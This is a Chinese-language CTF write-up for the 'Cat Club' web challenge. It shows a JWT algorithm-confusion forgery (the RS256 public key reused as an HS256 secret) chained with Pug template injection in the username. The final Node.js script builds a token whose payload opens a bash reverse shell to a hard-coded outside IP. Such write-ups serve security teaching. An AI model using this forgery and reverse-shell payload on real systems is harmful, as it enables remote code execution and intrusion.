---
title: "1337 live CTF web Cat Club 单题wp"
date: 2024-11-19 21:54
updated: 2024-11-19 21:54
categories: "CTF"
tags:
  - "CTF"
  - "Web Security"
  - "Writeup"
  - "Crypto"
description: "跟wgpsec打，贴wgpsec wp：https://mp.weixin.qq.com/s/xNaax4gs57QJewENxlTT5g 这次web3出的特别好，写篇wp记录一下 下载附件，审计。整个web app大致实现了一个注册登录和访问静态页面的功能。注意到用的jwt做登陆凭证。且使用的RS"
original_url: "https://www.cnblogs.com/LAMENTXU/articles/18553824"
---
跟wgpsec打，贴wgpsec wp：[https://mp.weixin.qq.com/s/xNaax4gs57QJewENxlTT5g](https://mp.weixin.qq.com/s/xNaax4gs57QJewENxlTT5g)

这次web3出的特别好，写篇wp记录一下

下载附件，审计。整个web app大致实现了一个注册登录和访问静态页面的功能。注意到用的jwt做登陆凭证。且使用的RS256算法。**而且有好好的JWT库不用非得自己写jwt验证算法，可疑**。

jwt验证部分（jwt\_helpers.js）

```
const jwt = require("json-web-token");
const fs = require("fs");
const path = require("path");

const privateKey = fs.readFileSync(path.join(__dirname, "..", "private_key.pem"), "utf8");
const publicKey = fs.readFileSync(path.join(__dirname, "..", "public_key.pem"), "utf8");

function signJWT(payload) {
    return new Promise((resolve, reject) => {
        jwt.encode(privateKey, payload, "RS256", (err, token) => {
            if (err) {
                return reject(new Error("Error encoding token"));
            }
            resolve(token);
        });
    });
}

function verifyJWT(token) {
    return new Promise((resolve, reject) => {
        if (!token || typeof token !== "string" || token.split(".").length !== 3) {
            return reject(new Error("Invalid token format"));
        }

        jwt.decode(publicKey, token, (err, payload, header) => {
            if (err) {
                return reject(new Error("Invalid or expired token"));
            }

            if (header.alg.toLowerCase() === "none") {
                return reject(new Error("Algorithm 'none' is not allowed"));
            }

            resolve(payload);
        });
    });
}

module.exports = { signJWT, verifyJWT };
```

还是太菜了，第一眼看到禁止了none，第二眼看到限制了类型为string和`.`的个数（无法构造畸形jwt）就不会别的了，没审出问题来

反正看到RS256先盲猜一手应该是公钥碰撞+分解n破解私钥。管他呢！先碰撞公钥再说。随便注册两个账户，用 [https://github.com/silentsignal/rsa\_sign2n](https://github.com/silentsignal/rsa_sign2n) 电脑穿越火线了半个小时出公钥

![](/images/migrated/18553824/01.png)

```
-----BEGIN PUBLIC KEY-----
MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAw4oPEx+448XQWH/OtSWN
8L0NUDU+rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpat
hL1zf3/Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQz
YcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnR
fT5HJjSRu/JmGlYCrFSof5p/E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t
8opUrLbrJYoWFeYZOY/Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ+H
dwIDAQAB
-----END PUBLIC KEY-----
```

（后来发现网站有个jwks.json可以直接获取jwk出公钥，小丑了属于是）

后来直接上ctfrsatools爆破，无果。卡死了。只能放弃这条路。我们可以看到最后是要读取同目录下的flag.txt文件，伪造jwt也不能读取文件啊（除了kid读取漏洞）于是觉得可能是想多了，就没再关注。

这里的sink其实很简单。显然看到pub就应该应激想到SSRF的。然而没有找到complie函数（所以一开始没看，显然能触发pub SSTI的函数不止compile还有render，我也是有够人机的）。但后来跳出jwt的思维之后很快就发现了sink

![](/images/migrated/18553824/02.png)

这里把guest替换成了登录用户的名称（如果已经登陆了的话）然后直接render。显然，在用户名处注入代码，在主页渲染的时候可以打pub模板注入攻击。

跟进替换guest的req.user，看到它是从getCurrentUser函数中获取

![](/images/migrated/18553824/03.png)

从jwt里获取用户名直接渲染！于是我兴致勃勃地去看注册功能，看看能不能合法地注册到含特殊字符的用户名：

```
const { BadRequest } = require("http-errors");

function sanitizeUsername(username) {
    const usernameRegex = /^[a-zA-Z0-9]+$/;

    if (!usernameRegex.test(username)) {
        throw new BadRequest("Username can only contain letters and numbers.");
    }

    return username;
}

module.exports = {
    sanitizeUsername,
};
```

用户名只能包含数字和英文字母。。。看了一下也没有SQL注入的可能。

于是与最开始的思路串联起来。我们也许可以通过伪造jwt的方式将SSTI注入代码写到用户名里（在渲染的时候没有做用户是否存在的检查）。这显然是行得通的一种思路。但这就需要我们获取到可以伪造jwt的密钥，也就是RS256算法里的私钥。根据我ctfrsatool跑了一晚上也没跑出来的结果看是不可能直接分解公钥n来解私钥的（网鼎青龙组web1就可以www）。

于是又回来看jwt验证代码。

![](/images/migrated/18553824/04.png)

细心一点看，可以发现虽然说这个代码验证了加密算法不能为none。但是却没有指定算法一定是RS256就进resolve了！！！

于是我拿着依赖`"json-web-token": "~3.0.0"`上网查，果然有一个算法降级的洞。

我们可以使用公钥在HS256下伪造，再将算法头改成HS256。这样就相当于把公开的公钥当成了HS256里的密钥进行签名。在jwt验证里是合法的！！！也就是说，服务器没有验证jwt的算法头就让第三方库去验证了，而这个第三方库也没有去验证算法头，导致攻击者可以随意更改算法。

于是把公钥扔到HS256算法里当密钥来伪造jwt，并把算法头改成HS256，写一个弹shell的脚本

```
const crypto = require('crypto');
const jwt = require("json-web-token");

const jwk = { "kty": "RSA", "n": "w4oPEx-448XQWH_OtSWN8L0NUDU-rv1jMiL0s4clcuyVYvgpSV7FsvAG65EnEhXaYpYeMf1GMmUxBcyQOpathL1zf3_Jk5IsbhEmuUZ28Ccd8l2gOcURVFA3j4qMt34OlPqzf9nXBvljntTuZcQzYcGEtM7Sd9sSmg8uVx8f1WOmUFCaqtC26HdjBMnNfhnLKY9iPxFPGcE8qa8SsrnRfT5HJjSRu_JmGlYCrFSof5p_E0WPyCUbAV5rfgTm2CewF7vIP1neI5jwlcm22X2t8opUrLbrJYoWFeYZOY_Wr9vZb23xmmgo98OAc5icsvzqYODQLCxw4h9IxGEmMZ-Hdw", "e": "AQAB", "alg": "RS256", "use": "sig" };
const base64urlDecode = (str) =>
    Buffer.from(str.replace(/-/g, '+').replace(/_/g, '/'), 'base64');

const publicKey = crypto.createPublicKey({
    key: {
        kty: jwk.kty,
        n: base64urlDecode(jwk.n).toString('base64'), 
        e: base64urlDecode(jwk.e).toString('base64')  
    },
    format: 'jwk'
});

console.log(publicKey.export({ format: 'pem', type: 'spki' }));
const abc = publicKey.export({ format: 'pem', type: 'spki' });

let result = jwt.encode(abc, {
    "username": "#{process.mainModule.require('child_process').exec('bash -c \"bash -i >& /dev/tcp/120.26.139.208/9001 0>&1\"')}"}, "HS256")
console.log(result);
```

![](/images/migrated/18553824/05.png)

弹shell 拿flag

**INTIGRITI{h3y\_y0u\_c4n7\_ch41n\_7h053\_vlun5\_l1k3\_7h47}**
